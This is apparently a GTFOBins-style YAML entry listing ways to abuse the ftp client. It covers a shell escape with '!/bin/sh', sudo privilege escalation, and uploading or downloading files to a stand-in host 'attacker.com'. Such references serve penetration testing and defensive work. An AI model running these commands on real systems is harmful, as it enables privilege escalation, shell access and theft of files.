---
functions:
  exec-interactive:
    - code: |
        ftp
        !/bin/sh
  sudo-enabled:
    - code: |
        sudo ftp
        !/bin/sh
  upload:
    - description: Send local file to a FTP server.
      code: |
        RHOST=attacker.com
        ftp $RHOST
        put file_to_send
  download:
    - description: Fetch a remote file from a FTP server.
      code: |
        RHOST=attacker.com
        ftp $RHOST
        get file_to_get
---